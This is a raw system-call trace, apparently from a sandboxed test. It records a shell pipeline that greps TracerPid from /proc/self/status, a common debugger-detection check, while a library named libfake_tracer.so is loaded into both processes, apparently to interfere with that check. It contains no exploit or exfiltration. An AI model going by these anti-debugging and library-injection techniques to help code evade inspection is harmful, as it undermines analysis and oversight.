10    10:07:54.352723 <... rt_sigprocmask resumed>NULL, 8) = 0
12    10:07:54.353008 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
11    10:07:54.353296 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/grep",  <unfinished ...>
12    10:07:54.353552 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/awk",  <unfinished ...>
10    10:07:54.353810 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12    10:07:54.354114 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
11    10:07:54.354348 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
12    10:07:54.354596 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/awk",  <unfinished ...>
10    10:07:54.354853 <... rt_sigprocmask resumed>[CHLD], 8) = 0
12    10:07:54.355123 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
11    10:07:54.355360 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    10:07:54.355555 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/awk",  <unfinished ...>
10    10:07:54.355771 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
12    10:07:54.355985 <... newfstatat resumed>0x7ffdbb499730, 0) = -1 ENOENT (No such file or directory)
11    10:07:54.356199 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    10:07:54.356422 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
10    10:07:54.356643 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
12    10:07:54.356859 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    10:07:54.357063 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    10:07:54.357257 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
10    10:07:54.357436 wait4(-1,  <unfinished ...>
12    10:07:54.358026 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    10:07:54.360329 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    10:07:54.363356 geteuid( <unfinished ...>
11    10:07:54.365980 geteuid( <unfinished ...>
12    10:07:54.367433 <... geteuid resumed>) = 1001
11    10:07:54.368341 <... geteuid resumed>) = 1001
12    10:07:54.369237 getegid( <unfinished ...>
11    10:07:54.369910 getegid( <unfinished ...>
12    10:07:54.370464 <... getegid resumed>) = 1001
11    10:07:54.371039 <... getegid resumed>) = 1001
12    10:07:54.371547 getuid( <unfinished ...>
11    10:07:54.372014 getuid( <unfinished ...>
12    10:07:54.372596 <... getuid resumed>) = 1001
11    10:07:54.373052 <... getuid resumed>) = 1001
12    10:07:54.373449 getgid( <unfinished ...>
11    10:07:54.373833 getgid( <unfinished ...>
12    10:07:54.374193 <... getgid resumed>) = 1001
11    10:07:54.374566 <... getgid resumed>) = 1001
12    10:07:54.374922 access("/usr/bin/awk", X_OK <unfinished ...>
11    10:07:54.375269 access("/usr/bin/grep", X_OK <unfinished ...>
12    10:07:54.375577 <... access resumed>) = 0
11    10:07:54.375862 <... access resumed>) = 0
12    10:07:54.376161 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/awk",  <unfinished ...>
11    10:07:54.376495 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/grep",  <unfinished ...>
12    10:07:54.376861 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=170768, ...}, 0) = 0
11    10:07:54.377197 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=186824, ...}, 0) = 0
12    10:07:54.377527 geteuid( <unfinished ...>
11    10:07:54.377813 geteuid( <unfinished ...>
12    10:07:54.378070 <... geteuid resumed>) = 1001
11    10:07:54.378323 <... geteuid resumed>) = 1001
12    10:07:54.378582 getegid( <unfinished ...>
11    10:07:54.378807 getegid( <unfinished ...>
12    10:07:54.379064 <... getegid resumed>) = 1001
11    10:07:54.379305 <... getegid resumed>) = 1001
12    10:07:54.379531 getuid( <unfinished ...>
11    10:07:54.379749 getuid( <unfinished ...>
12    10:07:54.379964 <... getuid resumed>) = 1001
11    10:07:54.380193 <... getuid resumed>) = 1001
12    10:07:54.380420 getgid( <unfinished ...>
11    10:07:54.380656 getgid( <unfinished ...>
12    10:07:54.381011 <... getgid resumed>) = 1001
11    10:07:54.381266 <... getgid resumed>) = 1001
12    10:07:54.381511 access("/usr/bin/awk", R_OK <unfinished ...>
11    10:07:54.381809 access("/usr/bin/grep", R_OK <unfinished ...>
12    10:07:54.382037 <... access resumed>) = 0
11    10:07:54.382224 <... access resumed>) = 0
12    10:07:54.382464 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
11    10:07:54.382724 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
12    10:07:54.382927 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.383126 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
12    10:07:54.383607 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
11    10:07:54.385657 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
12    10:07:54.388034 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.390638 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
12    10:07:54.391945 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
11    10:07:54.393284 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
12    10:07:54.393959 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
11    10:07:54.394601 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
12    10:07:54.395139 execve("/usr/bin/awk", ["awk", "{print $2}"], 0x55c912608530 /* 8 vars */ <unfinished ...>
11    10:07:54.395632 execve("/usr/bin/grep", ["grep", "-i", "TracerPid", "/proc/self/status"], 0x55c912608530 /* 8 vars */ <unfinished ...>
12    10:07:54.396778 <... execve resumed>) = 0
12    10:07:54.397374 brk(NULL <unfinished ...>
11    10:07:54.397742 <... execve resumed>) = 0
12    10:07:54.398137 <... brk resumed>) = 0x58b069ce9000
11    10:07:54.398493 brk(NULL <unfinished ...>
12    10:07:54.398826 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    10:07:54.399165 <... brk resumed>) = 0x614f067fe000
12    10:07:54.399471 <... mmap resumed>) = 0x730f43b5f000
11    10:07:54.399773 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    10:07:54.400122 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
11    10:07:54.400472 <... mmap resumed>) = 0x73ff9ec95000
11    10:07:54.400870 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
12    10:07:54.401247 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
12    10:07:54.401655 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
11    10:07:54.401949 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
12    10:07:54.402270 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
11    10:07:54.402550 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
12    10:07:54.402792 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
11    10:07:54.403070 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
11    10:07:54.403355 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
12    10:07:54.403587 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
11    10:07:54.403821 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
12    10:07:54.404052 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
11    10:07:54.404304 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
12    10:07:54.404526 <... mmap resumed>) = 0x730f43b5a000
11    10:07:54.404717 <... mmap resumed>) = 0x73ff9ec90000
12    10:07:54.404913 mmap(0x730f43b5b000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
11    10:07:54.405162 mmap(0x73ff9ec91000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
12    10:07:54.405382 <... mmap resumed>) = 0x730f43b5b000
11    10:07:54.405558 <... mmap resumed>) = 0x73ff9ec91000
12    10:07:54.405739 mmap(0x730f43b5c000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
11    10:07:54.405926 mmap(0x73ff9ec92000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
12    10:07:54.406119 <... mmap resumed>) = 0x730f43b5c000
11    10:07:54.406288 <... mmap resumed>) = 0x73ff9ec92000
12    10:07:54.406457 mmap(0x730f43b5d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
11    10:07:54.406629 mmap(0x73ff9ec93000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
12    10:07:54.406806 <... mmap resumed>) = 0x730f43b5d000
11    10:07:54.406968 <... mmap resumed>) = 0x73ff9ec93000
12    10:07:54.407138 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
11    10:07:54.407307 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
12    10:07:54.407481 <... close resumed>) = 0
11    10:07:54.407630 <... close resumed>) = 0
12    10:07:54.407781 access("/etc/ld.so.preload", R_OK <unfinished ...>
11    10:07:54.407972 access("/etc/ld.so.preload", R_OK <unfinished ...>
12    10:07:54.408177 <... access resumed>) = -1 ENOENT (No such file or directory)
11    10:07:54.408364 <... access resumed>) = -1 ENOENT (No such file or directory)
12    10:07:54.408553 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
11    10:07:54.408805 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
12    10:07:54.411365 <... openat resumed>) = 3</etc/ld.so.cache>
11    10:07:54.413458 <... openat resumed>) = 3</etc/ld.so.cache>
12    10:07:54.415828 fstat(3</etc/ld.so.cache>,  <unfinished ...>
11    10:07:54.417146 fstat(3</etc/ld.so.cache>,  <unfinished ...>
12    10:07:54.418055 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
11    10:07:54.418730 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
12    10:07:54.419587 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
11    10:07:54.420165 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
12    10:07:54.420670 <... mmap resumed>) = 0x730f43b58000
11    10:07:54.421133 <... mmap resumed>) = 0x73ff9ec8e000
12    10:07:54.421570 close(3</etc/ld.so.cache> <unfinished ...>
11    10:07:54.421948 close(3</etc/ld.so.cache> <unfinished ...>
12    10:07:54.422329 <... close resumed>) = 0
11    10:07:54.422643 <... close resumed>) = 0
12    10:07:54.422980 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libm.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
11    10:07:54.423314 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC <unfinished ...>
12    10:07:54.423632 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libm.so.6>
11    10:07:54.423908 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>
12    10:07:54.424244 read(3</usr/lib/x86_64-linux-gnu/libm.so.6>,  <unfinished ...>
11    10:07:54.424583 read(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>,  <unfinished ...>
12    10:07:54.424924 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
11    10:07:54.425237 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
12    10:07:54.425532 fstat(3</usr/lib/x86_64-linux-gnu/libm.so.6>,  <unfinished ...>
11    10:07:54.425813 fstat(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>,  <unfinished ...>
12    10:07:54.426103 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=952616, ...}) = 0
11    10:07:54.426407 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
12    10:07:54.426694 mmap(NULL, 950296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0 <unfinished ...>
11    10:07:54.426956 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0 <unfinished ...>
12    10:07:54.427201 <... mmap resumed>) = 0x730f43a6f000
11    10:07:54.427421 <... mmap resumed>) = 0x73ff9ebf4000
12    10:07:54.427829 mmap(0x730f43a7f000, 520192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0x10000 <unfinished ...>
11    10:07:54.428261 mmap(0x73ff9ebf6000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x2000 <unfinished ...>
12    10:07:54.428545 <... mmap resumed>) = 0x730f43a7f000
11    10:07:54.428784 <... mmap resumed>) = 0x73ff9ebf6000
12    10:07:54.429020 mmap(0x730f43afe000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0x8f000 <unfinished ...>
11    10:07:54.429253 mmap(0x73ff9ec64000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x70000 <unfinished ...>
12    10:07:54.429489 <... mmap resumed>) = 0x730f43afe000
11    10:07:54.429702 <... mmap resumed>) = 0x73ff9ec64000
12    10:07:54.429921 mmap(0x730f43b56000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libm.so.6>, 0xe7000 <unfinished ...>
11    10:07:54.430114 mmap(0x73ff9ec8c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x97000 <unfinished ...>
12    10:07:54.430304 <... mmap resumed>) = 0x730f43b56000
11    10:07:54.430498 <... mmap resumed>) = 0x73ff9ec8c000
12    10:07:54.430686 close(3</usr/lib/x86_64-linux-gnu/libm.so.6> <unfinished ...>
11    10:07:54.430889 close(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2> <unfinished ...>
12    10:07:54.431134 <... close resumed>) = 0
11    10:07:54.431366 <... close resumed>) = 0
12    10:07:54.431577 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
11    10:07:54.431794 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
12    10:07:54.432014 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
11    10:07:54.432222 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
12    10:07:54.432417 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    10:07:54.432609 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    10:07:54.433035 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
11    10:07:54.433487 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
12    10:07:54.435057 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    10:07:54.437768 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    10:07:54.440255 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
11    10:07:54.441947 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
12    10:07:54.443552 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    10:07:54.444424 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    10:07:54.445094 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
11    10:07:54.445732 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
12    10:07:54.446308 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
11    10:07:54.446798 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
12    10:07:54.447335 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
11    10:07:54.447865 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
12    10:07:54.448851 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
11    10:07:54.449340 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
12    10:07:54.449773 <... mmap resumed>) = 0x730f4385d000
11    10:07:54.450151 <... mmap resumed>) = 0x73ff9e9e2000
12    10:07:54.450670 mmap(0x730f43885000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
11    10:07:54.451031 mmap(0x73ff9ea0a000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
12    10:07:54.451419 <... mmap resumed>) = 0x730f43885000
11    10:07:54.451676 <... mmap resumed>) = 0x73ff9ea0a000
12    10:07:54.451942 mmap(0x730f43a0d000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
11    10:07:54.452272 mmap(0x73ff9eb92000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
12    10:07:54.452590 <... mmap resumed>) = 0x730f43a0d000
11    10:07:54.453183 <... mmap resumed>) = 0x73ff9eb92000
12    10:07:54.453566 mmap(0x730f43a5c000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
11    10:07:54.454150 mmap(0x73ff9ebe1000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
12    10:07:54.454481 <... mmap resumed>) = 0x730f43a5c000
11    10:07:54.454824 <... mmap resumed>) = 0x73ff9ebe1000
12    10:07:54.455306 mmap(0x730f43a62000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    10:07:54.455626 mmap(0x73ff9ebe7000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    10:07:54.455940 <... mmap resumed>) = 0x730f43a62000
11    10:07:54.456280 <... mmap resumed>) = 0x73ff9ebe7000
12    10:07:54.456578 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
11    10:07:54.456938 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
12    10:07:54.457290 <... close resumed>) = 0
11    10:07:54.457671 <... close resumed>) = 0
12    10:07:54.458017 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    10:07:54.458333 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    10:07:54.458648 <... mmap resumed>) = 0x730f4385a000
11    10:07:54.458963 <... mmap resumed>) = 0x73ff9e9df000
12    10:07:54.460002 arch_prctl(ARCH_SET_FS, 0x730f4385a740 <unfinished ...>
11    10:07:54.460619 arch_prctl(ARCH_SET_FS, 0x73ff9e9df740 <unfinished ...>
12    10:07:54.460948 <... arch_prctl resumed>) = 0
11    10:07:54.461346 <... arch_prctl resumed>) = 0
12    10:07:54.461944 set_tid_address(0x730f4385aa10 <unfinished ...>
11    10:07:54.462266 set_tid_address(0x73ff9e9dfa10 <unfinished ...>
12    10:07:54.462791 <... set_tid_address resumed>) = 12
11    10:07:54.466417 <... set_tid_address resumed>) = 11
12    10:07:54.466939 set_robust_list(0x730f4385aa20, 24 <unfinished ...>
11    10:07:54.467310 set_robust_list(0x73ff9e9dfa20, 24 <unfinished ...>
12    10:07:54.467625 <... set_robust_list resumed>) = 0
11    10:07:54.467978 <... set_robust_list resumed>) = 0
12    10:07:54.468336 rseq(0x730f4385b060, 0x20, 0, 0x53053053 <unfinished ...>
11    10:07:54.468841 rseq(0x73ff9e9e0060, 0x20, 0, 0x53053053 <unfinished ...>
12    10:07:54.469206 <... rseq resumed>) = 0
11    10:07:54.469532 <... rseq resumed>) = 0
12    10:07:54.469892 mprotect(0x730f43a5c000, 16384, PROT_READ <unfinished ...>
11    10:07:54.470236 mprotect(0x73ff9ebe1000, 16384, PROT_READ <unfinished ...>
12    10:07:54.470566 <... mprotect resumed>) = 0
11    10:07:54.470900 <... mprotect resumed>) = 0
12    10:07:54.471231 mprotect(0x730f43b56000, 4096, PROT_READ <unfinished ...>
11    10:07:54.471561 mprotect(0x73ff9ec8c000, 4096, PROT_READ <unfinished ...>
12    10:07:54.471881 <... mprotect resumed>) = 0
11    10:07:54.472239 <... mprotect resumed>) = 0
12    10:07:54.472552 mprotect(0x730f43b5d000, 4096, PROT_READ <unfinished ...>
11    10:07:54.472846 mprotect(0x73ff9ec93000, 4096, PROT_READ <unfinished ...>
12    10:07:54.473181 <... mprotect resumed>) = 0
11    10:07:54.473537 <... mprotect resumed>) = 0
12    10:07:54.473892 mprotect(0x58b058f77000, 4096, PROT_READ <unfinished ...>
11    10:07:54.474269 mprotect(0x614ecfa5e000, 8192, PROT_READ <unfinished ...>
12    10:07:54.474668 <... mprotect resumed>) = 0
11    10:07:54.475120 <... mprotect resumed>) = 0
12    10:07:54.475477 mprotect(0x730f43b97000, 8192, PROT_READ <unfinished ...>
11    10:07:54.475819 mprotect(0x73ff9eccd000, 8192, PROT_READ <unfinished ...>
12    10:07:54.476162 <... mprotect resumed>) = 0
11    10:07:54.476529 <... mprotect resumed>) = 0
12    10:07:54.476898 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
11    10:07:54.477248 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
12    10:07:54.477552 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
11    10:07:54.477867 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
12    10:07:54.478211 munmap(0x730f43b58000, 7295 <unfinished ...>
11    10:07:54.478563 munmap(0x73ff9ec8e000, 7295 <unfinished ...>
12    10:07:54.478884 <... munmap resumed>) = 0
11    10:07:54.479191 <... munmap resumed>) = 0
12    10:07:54.479487 getrandom( <unfinished ...>
11    10:07:54.479772 getrandom( <unfinished ...>
12    10:07:54.480028 <... getrandom resumed>"\x2c\x03\x6d\xb4\xa2\x6b\xe0\xf9", 8, GRND_NONBLOCK) = 8
11    10:07:54.480380 <... getrandom resumed>"\x6b\xdd\xe9\x56\x51\xaf\x92\xd5", 8, GRND_NONBLOCK) = 8
12    10:07:54.480662 brk(NULL <unfinished ...>
11    10:07:54.480962 brk(NULL <unfinished ...>
12    10:07:54.481305 <... brk resumed>) = 0x58b069ce9000
11    10:07:54.481673 <... brk resumed>) = 0x614f067fe000
12    10:07:54.481983 brk(0x58b069d0a000 <unfinished ...>
11    10:07:54.482316 brk(0x614f0681f000 <unfinished ...>
12    10:07:54.482621 <... brk resumed>) = 0x58b069d0a000
11    10:07:54.482924 <... brk resumed>) = 0x614f0681f000
12    10:07:54.483215 mmap(NULL, 266240, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
11    10:07:54.483513 openat(AT_FDCWD</sandbox>, "/proc/self/maps", O_RDONLY <unfinished ...>
12    10:07:54.483862 <... mmap resumed>) = 0x730f43819000
11    10:07:54.484140 <... openat resumed>) = 3</proc/11/maps>
12    10:07:54.484446 ioctl(0<pipe:[85003]>, TCGETS <unfinished ...>
11    10:07:54.484771 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
12    10:07:54.485102 <... ioctl resumed>, 0x7ffe288c3d30) = -1 ENOTTY (Inappropriate ioctl for device)
11    10:07:54.485438 <... mmap resumed>) = 0x73ff9ec8e000
12    10:07:54.485770 read(0<pipe:[85003]>,  <unfinished ...>
11    10:07:54.486106 lseek(3</proc/11/maps>, 0, SEEK_SET) = 0
11    10:07:54.486865 read(3</proc/11/maps>, "614ecfa32000-614ecfa36000 r--p 0"..., 8192) = 3246
11    10:07:54.487596 read(3</proc/11/maps>, "", 4946) = 0
11    10:07:54.488218 close(3</proc/11/maps>) = 0
11    10:07:54.488849 munmap(0x73ff9ec8e000, 8192) = 0
11    10:07:54.489399 sigaltstack({ss_sp=0x614ecfa607c0, ss_flags=0, ss_size=65536}, NULL) = 0
